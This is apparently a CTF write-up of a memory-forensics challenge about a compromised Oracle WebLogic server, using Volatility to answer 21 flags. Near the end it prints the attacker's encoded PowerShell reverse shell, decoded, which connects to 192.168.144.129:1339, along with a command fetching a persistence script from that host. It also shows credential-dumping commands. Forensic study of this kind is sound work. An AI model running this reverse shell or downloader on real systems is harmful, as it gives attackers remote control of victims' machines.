# Author: Panagiotis Fiskils/Neuro #

## Challenge name: CyberDefenders:  BSidesJeddah-Part2 ##

### Description: ###

```
The #NSM gear flagged suspicious traffic coming from one of the organization's web servers. Analyze the server's captured memory image and figure out what happened.
```

#### Enumeration: ####

```bash
volatility -f memory.mem imageinfo |tee imageinfo.log
```

# Flags: #

- Flag 1:```5b3b1e1c92ddb1c128eca0fa8c917c16c275ad4c95b19915a288a745f9960f39```

```bash
sha256sum memory.mem
```

- Flag 2:```2021-08-06 16:13:23```

From imageinfo

- Flag 3:```Win2016x64_14393```

We run imageinfo

- Flag 4:```WIN-8QOTRH7EMHC```

```bash
volatility3 -f memory.mem windows.registry.hivelist.HiveList
volatility3 -f memory.mem windows.registry.printkey.PrintKey  --offset 0x808fe7e41000 --key "ControlSet001\Control\ComputerName"
volatility3 -f memory.mem windows.registry.printkey.PrintKey  --offset 0x808fe7e41000 --key "ControlSet001\Control\ComputerName\ComputerName"
```

- Flag 5:```192.168.144.131```

```bash
volatility3 -f memory.mem windows.registry.hivelist.HiveList |tee hivelist.log
volatility3 -f memory.mem windows.registry.printkey.PrintKey --offset 0x808fe7e41000 --key "ControlSet001\Control\CurrentControlSet\Services\Tcpip\Parameters\Interfaces"
volatility3 -f memory.mem windows.netscan.NetScan
```

- Flag 6:```12```

```bash
volatility3 -f memory.mem windows.netscan.NetScan |tee netscan.log
cat netscan.log |grep "^0x" |grep "ESTABLISHED" |wc -l
```

- Flag 7:```2676```

```bash
volatility3 -f memory.mem windows.pstree.PsTree |tee pstree.log
cat netscan.log |grep -i "expl"
```

- Flag 8:```Google News```

```bash
volatility --plugin=/opt/volatility/volatility/plugins/ -f memory.mem --profile=Win2016x64_14393 iehistory |tee iehistory.log
```

We get this link:

```
https://news.google.com/topstories?hl=en-US&gl=US&ceid=US:en
```

- Flag 9:```Belkasoft```

```bash
volatility -f memory.mem --profile=Win2016x64_14393 cmdline |tee cmdline.log
```

We found an etry: <code>RamCapture64.exe</code>

We google the name and get the flag

- Flag 10:```52(dumbledore)oxim```

```bash
volatility -f memory.mem --profile=Win2016x64_14393 hashdump |tee hashdump.log
volatility --plugin=/opt/volatility/volatility/plugins/ -f memory.mem --profile=Win2016x64_14393 mimikatz |tee mimikatz.log
volatility -f memory.mem --profile=Win2016x64_14393 lsadump |tee lsadump.log
volatility3 -f memory.mem windows.hashdump.Hashdump #We used volatility3 and hashdump because it will give an easier hash
```

- Flag 11:```14.1.1.0.0```

```bash
volatility -f memory.mem --profile=Win2016x64_14393 pstree |tee pstree.log
volatility3 -f memory.mem windows.pstree.PsTree |tee pstree.log
volatility -f memory.mem --profile=Win2016x64_14393 procdump -p 4752 -D dump/ #Didn't work
```

I just googled for: <code>Web server logic RCE CVE</code>

And found this article:

```
https://www.tenable.com/blog/cve-2020-14882-oracle-weblogic-remote-code-execution-vulnerability-exploited-in-the-wild
```

- Flag 12:```80:7001```

We know the pid of the web server: <code>4752</code>

```bash
cat netscan.log |grep -i "4752" |grep "LISTENING"
```

- Flag 13:```4752```

From pstre we know that the wbloig server run on java.exe which has the pid of: <code>4752</code>

- Flag 14:```4772```

At first I didn't understood the challenge description but after some explanation I finally got it

```bash
cat netscan.log |grep "LISTENING" |grep "java.exe"|grep -A 1 -B 1 "4752"
```

- Flag 15:```44```

We had to find how many threads the java.exe had opened at the end (also took me a while to understand)

```bash
cat pstree.log |grep "java.exe" | tail -1
```

- Flag 16:```CVE-2020-14882```

Found this article:
 
```
https://www.tenable.com/blog/cve-2020-14882-oracle-weblogic-remote-code-execution-vulnerability-exploited-in-the-wild
```

- Flag 17:```192.168.144.129:1339```

```bash
cat netscan.log |grep "powershell"
```

- Flag 18:```Invoke-WebRequest -Uri "http://192.168.144.129:1338/presist.ps1" -OutFile "./presist.ps1"```

```bash
volatility -f memory.mem --profile=Win2016x64_14393 cmdscan |tee cmdscan.log
volatility -f memory.mem --profile=Win2016x64_14393 consoles |tee consoles.log
volatility -f memory.mem --profile=Win2016x64_14393 filescan |tee filescan.log
volatility3 -f memory.mem windows.cmdline.CmdLine |tee cmdline3.log
```

After a small nudge I had to run cmdline again but this time I used volatility3 and got a huge base64 encoded text:

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEANAA0AC4AMQAyADkAIgAsADEAMwAzADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

```bash
echo "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEANAA0AC4AMQAyADkAIgAsADEAMwAzADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" |base64 -d
```

And finally got the obfucated payload:

```$client = New-Object System.Net.Sockets.TCPClient("192.168.144.129",1339);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

After some deobfuscation and dynamic analysis because I'm lazy I got the flag

```sh
Invoke-WebRequest -Uri "http://192.168.144.129:1338/presist.ps1" -OutFile "./presist.ps1"
```

- Flag 19:```T1053.005```

The attacker used the process <code>taskschd.msc</code> to schedule his persistance this is the Mitre:T1053.005

- Flag 20:```fc627cf00878e4d4f7997cb26a80e6fc```

Found this plugin for volatility:

```
https://andreafortuna.org/2021/01/06/how-to-detect-cobalt-strike-beacons-using-volatility/
```

```bash
volatility --plugin=/opt/volatility/volatility/plugins/  -f memory.mem --profile=Win2016x64_14393 cobaltstrikescan |tee cobaltstrikescan.log
volatility -f memory.mem --profile=Win2016x64_14393 malfind |tee malfind.log
cat malfind.log |grep "Pid" |cut -d ":" -f 3 |cut -d " " -f 2
```

The process svchost.exe with Pid:1488 is kinda sus, so let's dump it

```bash
volatility -f memory.mem --profile=Win2016x64_14393 procdump -p 1488 -D dump/
volatility -f memory.mem --profile=Win2016x64_14393 memdump -p 1488 -D dump/
parse-beacon 1488.dmp
```

- Flag 21:```https://pastebin.com/A0Ljk8tu```

At the end of the file: <code>cmdline3.log</code> we can find this line:

```
4596	notepad.exe	"C:\Windows\System32\notepad.exe" exfiltrator.txt
```

```bash
volatility -f memory.mem --profile=Win2016x64_14393 memdump -p 4596 -D dump/
strings -e l 4596.dmp |grep -i -A 5 "exfil" |grep "http"
```
